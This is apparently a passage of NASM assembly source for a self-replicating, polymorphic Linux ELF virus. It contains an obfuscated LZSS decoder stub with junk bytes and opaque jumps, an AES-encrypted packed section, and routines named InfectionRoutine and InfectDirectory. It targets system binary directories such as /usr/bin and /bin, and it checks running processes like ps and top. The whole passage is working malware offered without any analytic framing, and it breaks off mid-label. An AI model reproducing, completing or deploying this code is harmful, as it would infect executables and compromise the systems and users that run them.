..@4VuKUZn0kQY5:
    mov         rdx, rdx
    js          ..@eJjwoLxtppBJ
    jns         ..@eJjwoLxtppBJ
..@YDdXMojpzMzt:
    xor         r2, r2
    jl          ..@PWHvxJRQKXe0
    jge         ..@PWHvxJRQKXe0
..@lQmUDXKm0PSj:
    call        rax
    jb          ..@ocpi2sReBAEW
    jae         ..@ocpi2sReBAEW
..@MovKenmOOJQS:
    jz          ..@g5XdrtmDghWI
    jmp         $+3
db 0xed
    js          ..@atepLXQwsNZm
    jns         ..@atepLXQwsNZm
..@aRih5gHacMDn:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jmp         $+4
db 0x09, 0x12
    jmp         ..@2r1zpPLUiYGs
..@v6PtupvVZr1V:
    mov         BYTE [rbx], al
    js          ..@vggo1k5GQsxm
    jns         ..@vggo1k5GQsxm
..@atepLXQwsNZm:
    or          eax, 1
    js          ..@g5XdrtmDghWI
    jns         ..@g5XdrtmDghWI
..@bhPOWYisX0zt:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    jmp         $+5
db 0xd3, 0x15, 0xff
    jmp         ..@oATrCFT742NI
..@PWHvxJRQKXe0:
    xor         r3, r3
    jmp         $+4
db 0xb6, 0x1a
    jmp         ..@4VuKUZn0kQY5
..@tCiL8asikolq:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    jb          ..@eIiaLmVEyBa4
    jae         ..@eIiaLmVEyBa4
..@Zk2lhbnw5QpG:
    call        ExitProgram
    jmp         $+5
db 0x10, 0x01, 0xe2
    je          LzssDecoder
    jne         LzssDecoder
..@xBVbEAmL57Ox:
    add         rsp, _LZSSD_OFF_size
    jl          ..@OJGgs1LqBrPN
    jge         ..@OJGgs1LqBrPN
..@4GG4vqiM68Hp:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    jmp         $+4
db 0x8a, 0x9d
    jmp         ..@WWvwHToWhTbr
..@DQeDn5wbfjIh:
    mov         rax, SYS_MUNMAP
    js          ..@ahJlrVFlCyb2
    jns         ..@ahJlrVFlCyb2
..@9wK5sHKIbXZI:
    push        rdi
    ret
    jmp         ..@xBVbEAmL57Ox
..@qubRzwbWWdsy:
    mov         rcx, POSITION_BITS
    xchg        rdx, rdx
    call        ..@N3XRTVgnqyyy
    mov         rsi, rax 
    mov         rcx, rcx
    je          ..@Ac7VeWLUQwtN
    jne         ..@Ac7VeWLUQwtN
..@evKjvfzMa6Vi:
%ifdef X86_64
    mov         eax, SYS_MMAP
    mov         rbx, rbx
    mov         rbp, rbp
%endif
    jmp         ..@x9SVBZYlLUq8
..@EgnjMoqY8S9M:
    and         bx, WINDOW_LENGTH-1
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         $+4
db 0xa5, 0xdf
    jmp         $+3
db 0xc0
    js          ..@v6PtupvVZr1V
    jns         ..@v6PtupvVZr1V
..@oATrCFT742NI:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+3
db 0xd9
    jmp         $+3
db 0x23
    je          ..@Ru68AtekY385
    jne         ..@Ru68AtekY385
..@vnURdmgnVXzJ:
    jmp         ..@xBVbEAmL57Ox
    jmp         $+5
db 0xd8, 0x66, 0x8d
    jmp         $+3
db 0xfc
    jmp         $+5
db 0x94, 0x46, 0x27
    js          ..@N3XRTVgnqyyy
    jns         ..@N3XRTVgnqyyy
..@atr4PpTjjLZU:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+3
db 0xb3
    jmp         $+3
db 0x07
    js          ..@Ev8mxbLhAArZ
    jns         ..@Ev8mxbLhAArZ
..@x9SVBZYlLUq8:
%ifdef X86_64
    syscall
%endif
    jmp         $+5
db 0x6f, 0x58, 0x44
    jmp         $+4
db 0x7d, 0x54
    js          ..@MpiNEAct3uay
    jns         ..@MpiNEAct3uay
..@7Q2jkHFHNPWc:
    mov         rsp, rsp
    jmp         ..@ZKtx5TQq5vcT
..@Ako4zs8nSyuX:
    xor         r2, r2
    mov         r2d, DWORD [r5]
    jmp         $+5
db 0xef, 0xc1, 0xab
    js          ..@cAy38mkE9HNT
    jns         ..@cAy38mkE9HNT
..@NSIzrEFzy33x:
    call        LzssDecoder
    je          ..@tCiL8asikolq
    jne         ..@tCiL8asikolq
..@MpiNEAct3uay:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jb          ..@YZJ8dmoYvF44
    jae         ..@YZJ8dmoYvF44
..@Xx7dDhdGx0OM:
    xchg        rbx, rbx
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    jmp         $+5
db 0x4b, 0x32, 0x25
    jmp         $+5
db 0xf8, 0xd6, 0x64
    jmp         ..@fKEnC1BXc6Xe
..@Zc2OSBIzT94U:
    pop         rdx
    inc         DWORD [rsp+_LZSSD_OFF.index]
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+3
db 0x6b
    jb          ..@Dhql4dOPN4Rq
    jae         ..@Dhql4dOPN4Rq
..@FrfuOvcWVi19:
    mov         rbx, rsi
    js          ..@bkyWy4gBvL5H
    jns         ..@bkyWy4gBvL5H
..@T16EiXtvG1fV:
    xor         r1, r1
    jmp         $+3
db 0x36
    jmp         $+4
db 0x8b, 0x99
    jmp         $+3
db 0xf7
    jmp         ..@YDdXMojpzMzt
..@pvgMvZFF9ZGT:
    jz          ..@qubRzwbWWdsy
    jl          ..@5hqzoZj7Gqwm
    jge         ..@5hqzoZj7Gqwm
..@FVfvBjnO9Qau:
    sub         rsp, _UEC_OFF_size
    jmp         $+3
db 0x81
    jmp         $+3
db 0xb7
    jl          ..@Zk2lhbnw5QpG
    jge         ..@Zk2lhbnw5QpG
..@cov7muya3RRF:
%ifdef X86_64
    xor         r9, r9
    mov         esi, original_virus_len-non_packed_len
    mov         edx, 111b
    mov         r10, 0x22
    mov         r8, 0xffffffffffffffff
%endif
    js          ..@evKjvfzMa6Vi
    jns         ..@evKjvfzMa6Vi
..@LIuM8JKHeJGY:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mov         rdi, rdi
    js          ..@Z6AEFBqHQlbT
    jns         ..@Z6AEFBqHQlbT
..@vrZGEQZqhGmW:
%ifdef X86_32
    mov         edx, 111b
    mov         esi, 0x22
    mov         edi, 0xffffffff
    xchg        rbx, rbx
%endif
    jmp         $+5
db 0xa1, 0xfd, 0x01
    jl          ..@bhPOWYisX0zt
    jge         ..@bhPOWYisX0zt
..@ldX46HTBHRtb:
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    test        dl, dl
    xchg        rbx, rbx
    xchg        rbx, rbx
    jmp         ..@dNzdtKVnzoMA
..@KYDxNKkSilCQ:
    pop         rdi
    push        rsi
    jmp         $+4
db 0x2b, 0xd0
    jmp         $+5
db 0x6f, 0x54, 0x00
    jmp         ..@2RiPpCzOWrLc
..@LtusltNgZ2Vb:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+5
db 0x5a, 0x1d, 0xde
    js          ..@mYpARmu3YCok
    jns         ..@mYpARmu3YCok
..@KUmT40x7hl6V:
    call        ..@N3XRTVgnqyyy
    xor         rdi, rdi
    jmp         $+5
db 0xed, 0xfa, 0x52
    jmp         $+3
db 0x28
    jmp         $+3
db 0x7e
    jmp         $+5
db 0xec, 0xe1, 0x93
    js          ..@IoaZcUJposBw
    jns         ..@IoaZcUJposBw
..@jZfahwNRWsIE:
    mov         rcx, 1
    jmp         $+5
db 0x4c, 0xde, 0x3e
    jmp         $+4
db 0x69, 0x23
    jl          ..@KMIA8qLqN0Q5
    jge         ..@KMIA8qLqN0Q5
..@KbM2MWRMv9jk:
    test        rax, rax
    jb          ..@pvgMvZFF9ZGT
    jae         ..@pvgMvZFF9ZGT
..@Lbu22Wt67gya:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    rep         nop
    mov         dl, BYTE [rbx]
    jmp         $+5
db 0x6e, 0xf3, 0x0b
    jmp         $+3
db 0x7f
    jb          ..@Xx7dDhdGx0OM
    jae         ..@Xx7dDhdGx0OM
..@kPKPzuFIHq5k:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    jmp         $+4
db 0x96, 0xcf
    jmp         $+4
db 0xab, 0x53
    jmp         ..@8Nz1uIref91e
..@g5XdrtmDghWI:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    jmp         $+3
db 0x4d
    jmp         $+3
db 0xaa
    jmp         $+5
db 0x2b, 0x79, 0x8c
    jmp         $+4
db 0x0d, 0x59
    jmp         $+5
db 0x56, 0x56, 0xb2
    jmp         ..@QLDJhm5Lpayg
..@RGQxlPE8QlZt:
    xchg        rbx, rbx
    jmp         $+3
db 0x0a
    jmp         $+5
db 0x7b, 0x46, 0x84
    jmp         ..@4GG4vqiM68Hp
..@Ac7VeWLUQwtN:
    mov         rcx, LENGTH_BITS
    call        ..@N3XRTVgnqyyy
    mov         rax, rax
    add         rax, 1
    mov         rdx, rax
    jmp         $+5
db 0x8d, 0x79, 0xb7
    js          ..@qVuM6mKtvG8C
    jns         ..@qVuM6mKtvG8C
..@eIiaLmVEyBa4:
    mov         m8, rax
    jl          ..@lQmUDXKm0PSj
    jge         ..@lQmUDXKm0PSj
..@mYpARmu3YCok:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+5
db 0x21, 0x9b, 0x65
    jmp         $+3
db 0xd2
    jmp         $+4
db 0x42, 0xce
    jmp         ..@atr4PpTjjLZU
..@QLDJhm5Lpayg:
    sub         rcx, 1
    jl          ..@Tks7POQqe4fD
    jge         ..@Tks7POQqe4fD
..@YZJ8dmoYvF44:
    GGLOBAL     _packed
    mov         r1, r5
    jb          ..@8PY9J67reOxH
    jae         ..@8PY9J67reOxH
..@IjQLe0owY2tt:
    jmp         ..@jZfahwNRWsIE
    jmp         ..@KbM2MWRMv9jk
..@WWvwHToWhTbr:
    jnz         ..@ZROAVvm5KTkP
    jmp         $+3
db 0x37
    jmp         $+5
db 0xd2, 0xc1, 0xcc
    jmp         ..@4douTrzX7Fc2
LzssDecoder:
    jmp         ..@LPdmT832t3na
..@2RiPpCzOWrLc:
    pop         rsi
    jmp         ..@IjQLe0owY2tt
..@eJjwoLxtppBJ:
%ifdef X86_32
    mov         rcx, rcx
%endif
    je          ..@OzK6NqBa33mc
    jne         ..@OzK6NqBa33mc
..@thKbDYSkyqsT:
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    jmp         ..@ldX46HTBHRtb
..@bkyWy4gBvL5H:
    mov         rdi, rdi
    add         bx, cx
    jmp         $+3
db 0x72
    je          ..@EgnjMoqY8S9M
    jne         ..@EgnjMoqY8S9M
..@Tks7POQqe4fD:
    jnz         ..@RGQxlPE8QlZt
    jl          ..@9wK5sHKIbXZI
    jge         ..@9wK5sHKIbXZI
..@cAy38mkE9HNT:
    sub         r2, non_packed_len
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+4
db 0xb1, 0xf0
    jmp         $+3
db 0x0d
    jmp         ..@NSIzrEFzy33x
..@LPdmT832t3na:
    sub         rsp, _LZSSD_OFF_size
    jb          ..@kPKPzuFIHq5k
    jae         ..@kPKPzuFIHq5k
..@fKEnC1BXc6Xe:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         $+5
db 0xcd, 0xfd, 0x84
    jmp         $+3
db 0x34
    jl          ..@aRih5gHacMDn
    jge         ..@aRih5gHacMDn
..@vggo1k5GQsxm:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    js          ..@eoIkEQ77UW0O
    jns         ..@eoIkEQ77UW0O
..@jcUtkJSc233u:
    pop         rcx
    js          ..@TDOlCuQ2smaA
    jns         ..@TDOlCuQ2smaA
..@Ru68AtekY385:
%ifdef X86_64
    mov         rbx, rbx
%endif
    jmp         $+3
db 0xe6
    jmp         ..@cov7muya3RRF
..@4douTrzX7Fc2:
    mov         rsp, rsp
    jmp         $+5
db 0x89, 0x90, 0xd7
    jmp         $+5
db 0x9a, 0x02, 0x7e
    jmp         ..@Lbu22Wt67gya
..@KMIA8qLqN0Q5:
    call        ..@N3XRTVgnqyyy
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jg          ..@KbM2MWRMv9jk
    jmp         ..@vnURdmgnVXzJ
..@UDfCu2YPYR2Y:
    xor         rax, rax
    js          ..@T16EiXtvG1fV
    jns         ..@T16EiXtvG1fV
..@N3XRTVgnqyyy:
    pop         rdi
    xor         rax, rax
    xor         rdx, rdx
    xor         rbx, rbx
    jmp         $+5
db 0xce, 0xec, 0x16
    jmp         ..@RGQxlPE8QlZt
..@ocpi2sReBAEW:
    xor         rax, rax
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    xchg        rdx, rdx
    mov         r2, original_virus_len-non_packed_len
    jmp         $+5
db 0x0e, 0x2c, 0xfc
    je          ..@DQeDn5wbfjIh
    jne         ..@DQeDn5wbfjIh
..@IoaZcUJposBw:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    push        rcx
    jmp         $+5
db 0xa3, 0x1e, 0xef
    je          ..@XIr636dLaNpc
    jne         ..@XIr636dLaNpc
..@2r1zpPLUiYGs:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    jl          ..@ZROAVvm5KTkP
    jge         ..@ZROAVvm5KTkP
..@ahJlrVFlCyb2:
    rep         nop
    syscall
    push        rdx
    pop         rdx
    jmp         $+3
db 0x57
    js          ..@FVfvBjnO9Qau
    jns         ..@FVfvBjnO9Qau
..@Dhql4dOPN4Rq:
    jmp         ..@jZfahwNRWsIE
    jmp         ..@qubRzwbWWdsy
..@qzOXKx1XsAHn:
    xchg        rdi, rdi
    add         ecx, 1
    cmp         cl, dl
    jle         ..@FrfuOvcWVi19
    push        rcx
    jmp         $+5
db 0x04, 0x14, 0x6d
    jmp         $+3
db 0x90
    jl          ..@jcUtkJSc233u
    jge         ..@jcUtkJSc233u
..@OzK6NqBa33mc:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
%endif
    jmp         $+5
db 0x3d, 0x19, 0x09
    jb          ..@vrZGEQZqhGmW
    jae         ..@vrZGEQZqhGmW

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _MUTA_OFF
    .start      resq 0x1
    .index      resd 0x1
    .size       resd 0x1
    .key        resq 0x1
    .random_BYTE resb 0x1
endstruc
struc _AESE_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
    .keyprev    resd 0x1
    .meta_ptr   resq 0x1
endstruc
struc _KEYGEN_OFF
    .bufferaddr resq 0x1
    .fd         resd 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc7:      db "top", 0
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

bash:       db "/bin/bash", 0
urandom:    db "/dev/urandom", 0
home:       db "HOME", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@dQrhTO9z3HpS
..@5uDCpXeOLmQq:
    xchg        rbx, rbx
    js          ..@MQbDMbIebK9n
    jns         ..@MQbDMbIebK9n
..@bLGN9AUvkhZi:
    movdqu      xmm1, oWORD [rsp+0x40]
    push        rdi
    jmp         $+4
db 0x35, 0xb5
    jmp         $+5
db 0x6b, 0x9a, 0xce
    jmp         $+5
db 0x02, 0xe4, 0x8e
    jmp         ..@o9Ll7MF2FcBJ
..@gdxWmThcBjhG:
    mov         rcx, QWORD [rsp]
    jl          ..@zupd5ifmLcI5
    jge         ..@zupd5ifmLcI5
..@DcR1SZ1r5dxv:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    jmp         ..@fv1jVEZioyhF
..@tjGZEGIniwbV:
    mov         r5, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    xchg        rax, rax
    mov         DWORD [r5+_signature.poly_preview-_start+(r4*2)], eax
    add         r4, 2
    jmp         $+3
db 0x23
    jb          ..@0HJlf22vNGgl
    jae         ..@0HJlf22vNGgl
ConvertJumpToDoubleJump:
    jmp         ..@1YbmsC3kcpIl
..@cb9AoJAZZlW6:
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    jl          ..@xhPoys1jryZn
    jge         ..@xhPoys1jryZn
..@tLdFaQtEm4WX:
    call        LzssEncoder
    push        rcx
    pop         rcx
    jl          ..@UKDvWB1oeMrw
    jge         ..@UKDvWB1oeMrw
..@aFRwZ6s6UWTH:
    mov         DWORD [rsp+_UPDATASIG_OFF.keyprev], r3d
    jb          ..@ofhzvqgLX4bC
    jae         ..@ofhzvqgLX4bC
..@SxmsLLvIDjvJ:
    push        rbx
    pop         rbx
    jmp         $+4
db 0x18, 0x47
    jmp         ..@qxqOSoktjUj2
..@2tgr1V7tXG8K:
    mov         r2, r4
    call        AddSizeMappedFile
    cmp         rax, (-1)
    je          ..@2EQTK68sczqo
    mov         r3, r4
    jmp         ..@43rnOixT1GyQ
..@fR2JI9maySRf:
%ifndef ENABLE_DEBUGGING
    mov         rdx, rdx
%endif
    jb          InfectionRoutine
    jae         InfectionRoutine
InfectionRoutine:
    jmp         ..@XoQnVLZAlaT3
..@evzyibI2I4iy:
    sub         r2, 1
    jmp         $+5
db 0x99, 0x4c, 0x3e
    jmp         $+5
db 0x23, 0x39, 0xe0
    je          ..@BDCKHm8th7rN
    jne         ..@BDCKHm8th7rN
..@3wJnIE2eoSGr:
    mov         rax, 2
    ret
    push        rsi
    pop         rsi
    js          ..@n8bRDgeOgnvg
    jns         ..@n8bRDgeOgnvg
..@DalaUHGULF3H:
    add         rsp, _PAYLOAD_OFF_size
    js          ..@wolbXgGjHzJj
    jns         ..@wolbXgGjHzJj
..@D08X0GU6K8Z9:
    call_vsp    Strncmp
    test        rax, rax
    je          ..@n8bRDgeOgnvg
    jmp         $+4
db 0x1a, 0x4a
    jb          ..@3wJnIE2eoSGr
    jae         ..@3wJnIE2eoSGr
..@97IL1VvCmaCF:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_SETSID
    syscall
    mov         rax, SYS_FORK
%endif
    jmp         ..@MZgmfQ5qMkV5
..@HNycmgBbMyqM:
    add         r1, 1
    jb          ..@AkRre0xxhWlV
    jae         ..@AkRre0xxhWlV
..@I17qbJR5z4zp:
    pop         rbx
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    push        rsi
    jb          ..@tbCAZdU4Maz7
    jae         ..@tbCAZdU4Maz7
..@AExS1q5ZgNao:
    pop         rsi
    jmp         $+3
db 0x5c
    jmp         ..@CyAUwDxMMzWh
..@93GEBVNRhhW9:
    push        rdx
    pop         rdx
    mov         rbp, rbp
    jmp         ..@YjcB9Mka3ZTa
InfectDirectory:
    jmp         ..@OE6YWcPhYsKx
..@2Rn1Ls7uDNIK:
    movdqu      xmm1, oWORD [rsp+0x60]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x70]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x80]
    js          ..@VkFFSnvEuGzz
    jns         ..@VkFFSnvEuGzz
..@nvR6oTBCYUJg:
    mov         rcx, QWORD [rsp]
    jmp         $+3
db 0xb3
    jmp         ..@18cLRXFrUJ3B
..@NkQ8Ks925khj:
    mov         r1, rsp
    add         r1, bytes
    jmp         $+3
db 0xe2
    jb          ..@Y8FJASZXDzdX
    jae         ..@Y8FJASZXDzdX
..@wK08yBowSRx0:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    jl          ..@Qmy4sWaorawn
    jge         ..@Qmy4sWaorawn
..@4fbtWs06FyNh:
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    mov         r3, rax
    push        rbx
    pop         rbx
    jmp         ..@nztl24vB8JaC
..@aMJzExN5GzLp:
    add         rdi, non_packed_len
    jb          ..@NC39EZgitreN
    jae         ..@NC39EZgitreN
..@EsaDFR85rJrQ:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    js          ..@CeTB4kcwqYPD
    jns         ..@CeTB4kcwqYPD
..@PoTzAzN2JRHh:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jge         ..@99Q6QG4UIoFZ
    mov         rdi, rdi
    jmp         $+5
db 0xd8, 0xa7, 0xbb
    jb          ..@WFSKuYnJMEHW
    jae         ..@WFSKuYnJMEHW
..@zxJWBRqFTg0p:
    jmp         ..@2EQTK68sczqo
    js          ..@MxJLCFmQmRuk
    jns         ..@MxJLCFmQmRuk
..@PIizWMab1Dcd:
%ifdef X86_64
    mov         rbx, rbx
%endif
    jmp         ..@U7580DFsEF3v
..@aXm2f2gxbwhx:
    and         dx, 0f0ffh
    jmp         $+5
db 0x3a, 0x62, 0xa6
    jmp         $+5
db 0xfb, 0x92, 0x38
    jmp         $+3
db 0xba
    je          ..@2IyxhvNG01nV
    jne         ..@2IyxhvNG01nV
..@rS9uCH51peMQ:
    push        rcx
    pop         rcx
    jmp         ..@IqyIJNVLcwnu
    jmp         ..@cHUe3JCPyWyu
..@HNopTPY5OgN4:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    jmp         ..@LmGileC6lGRO
..@cK1tRlOjOBLh:
    call        DYNPIEValidation
    jmp         $+3
db 0x37
    jmp         ..@aXwyaJqDcp43
..@ezV1MQT2q4El:
    pop         rdx
    jmp         $+5
db 0x88, 0x24, 0x26
    jmp         $+5
db 0x72, 0x1a, 0x90
    js          ..@jf0tcdVo7mKD
    jns         ..@jf0tcdVo7mKD
..@RWRfh0dskw1l:
%ifdef X86_64
    shr         rax, 8
%endif
    jmp         $+4
db 0xcc, 0x44
    jmp         $+4
db 0x4b, 0xb5
    jmp         ..@prbqmY2ABQAL
..@Evapy79nMLB3:
    pop         rcx
    jmp         $+5
db 0x7d, 0xf1, 0x2b
    jl          ..@YJjyQ2lZsd2i
    jge         ..@YJjyQ2lZsd2i
..@6T165rH4krB6:
    test        al, al
    jmp         $+3
db 0x29
    jmp         ..@ckUjyIb2lvvR
..@7NG216VwEMPs:
    xor         r4, r4
    jmp         $+4
db 0x56, 0xc4
    jmp         ..@1jjvYsdzX5Hn
..@8rIPxyxlhXCP:
    mov         BYTE [rsi], 05h
    mov         rax, 1
    je          ..@43SMy5O6uhWr
    jne         ..@43SMy5O6uhWr
..@SL8ODQEqRBGl:
    push        rdx
    js          ..@W0luSWuw8pZr
    jns         ..@W0luSWuw8pZr
..@voPgzt8uxdJw:
    add         BYTE [rdi], 2
    mov         BYTE [rdi+1], dl
    push        rbx
    jmp         $+4
db 0xeb, 0xcc
    jb          ..@27cKeQ9btI5N
    jae         ..@27cKeQ9btI5N
..@pvlZ8vgXBRN0:
    push        rax
    jl          ..@484SnfNaZ69f
    jge         ..@484SnfNaZ69f
..@S8nQycRDp9wX:
    xor         rdx, rdx
    xchg        rdx, rdx
    mov         edx, DWORD [rdi]
    xor         rbx, rbx
    jmp         $+5
db 0x1d, 0xaf, 0x1a
    jmp         $+4
db 0x38, 0x3a
    je          ..@qGR65cfViTth
    jne         ..@qGR65cfViTth
..@16CR4Uga9Suc:
    pop         rsi
    jmp         $+5
db 0x3e, 0x43, 0x72
    js          ..@F9j0xrzkEURk
    jns         ..@F9j0xrzkEURk
..@PUkftooUCdBf:
    xchg        rsp, rsp
    OFILE       [r1], 0x10000
    mov         rax, rax
    js          ..@BiomWBNve7YX
    jns         ..@BiomWBNve7YX
..@fLlNpfppFjj3:
    pop         rax
    jmp         ..@rkrWoa7ccYHV
..@PhL1cBxO8qMQ:
    movdqu      xmm1, oWORD [rsp+0xd0]
    aesenc      xmm0, xmm1
    xchg        rdi, rdi
    movdqu      xmm1, oWORD [rsp+0xe0]
    jmp         $+5
db 0x3c, 0x2f, 0xec
    jmp         $+3
db 0xec
    jb          ..@wdBp8B6Q6ecF
    jae         ..@wdBp8B6Q6ecF
..@bkgJAymg82JB:
%ifdef X86_64
    mov         bx, dx
%endif
    jmp         $+5
db 0x42, 0xcc, 0x58
    jmp         $+3
db 0xd9
    jmp         $+5
db 0x0e, 0x88, 0x29
    jl          ..@H48mxo4ZYiqj
    jge         ..@H48mxo4ZYiqj
..@7CPt1pu96CE7:
    push        rcx
    pop         rcx
    sub         rsp, _MUTA_OFF_size
    je          ..@Dq1xoShcutUB
    jne         ..@Dq1xoShcutUB
..@ca5zcOOQPYjo:
    push        rdx
    pop         rdx
    jmp         ..@JB9hrXOT8UTk
..@UMPq6uvInJt5:
%ifndef ENABLE_DEBUGGING
    jmp         ..@gvR834lDN6hJ
%endif
    jmp         $+5
db 0xc1, 0xe1, 0xef
    jb          ..@6WV3PGyos4w5
    jae         ..@6WV3PGyos4w5
..@oA58BSgBgXcH:
%ifdef X86_64
    cmp         al, 41h
%endif
    jmp         $+5
db 0xe0, 0x58, 0x1c
    jmp         $+4
db 0xa6, 0xf8
    jmp         ..@1tnVrNrkEBZz
..@YJQZXOkcpuob:
%ifndef ENABLE_DEBUGGING
    mov         rsi, rsi
    xor         r4, r4
%endif
    jmp         ..@DvAp575FV3tT
..@65Lpe5sDJH7q:
    GGLOBAL     _signature.start
    jb          ..@NzwpTP4F5lEy
    jae         ..@NzwpTP4F5lEy
..@NQvcqspJlBtv:
    xor         rax, rax
    jmp         $+5
db 0x04, 0xe3, 0xb4
    jmp         $+5
db 0x3a, 0x43, 0x91
    jmp         $+4
db 0xaf, 0x21
    jmp         $+3
db 0xe9
    jmp         $+4
db 0x34, 0xb7
    je          ..@8gmG6Cy9nGYC
    jne         ..@8gmG6Cy9nGYC
..@XHKvzoq4f7De:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
%endif
    jl          ..@m7hBQq0y3V2g
    jge         ..@m7hBQq0y3V2g
..@Mm98qW3Cm4Ih:
    push        rdi
    jl          ..@BYMLaYmwIt27
    jge         ..@BYMLaYmwIt27
..@51KBXkPwssNO:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jmp         $+5
db 0xbe, 0xb0, 0xd6
    je          ..@tASYEaOehKqL
    jne         ..@tASYEaOehKqL
..@AzmGX9piHzQG:
    jg          ..@zzBFybVeIetA
    jmp         $+5
db 0xc2, 0x2d, 0xdf
    jmp         $+3
db 0x7f
    js          ..@ig8GuIxx4T5Y
    jns         ..@ig8GuIxx4T5Y
..@GBdhlGSG5X1o:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+5
db 0x44, 0x3e, 0xe6
    jmp         ..@HXj9E4pQKLNc
..@HXj9E4pQKLNc:
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+3
db 0x03
    je          ..@OlJa7u3N3f4o
    jne         ..@OlJa7u3N3f4o
..@McQe2Nrmg57D:
    mov         r1, r5
    mov         r3, _signature.startsize
    jmp         ..@D08X0GU6K8Z9
..@S94AKi5HgXzC:
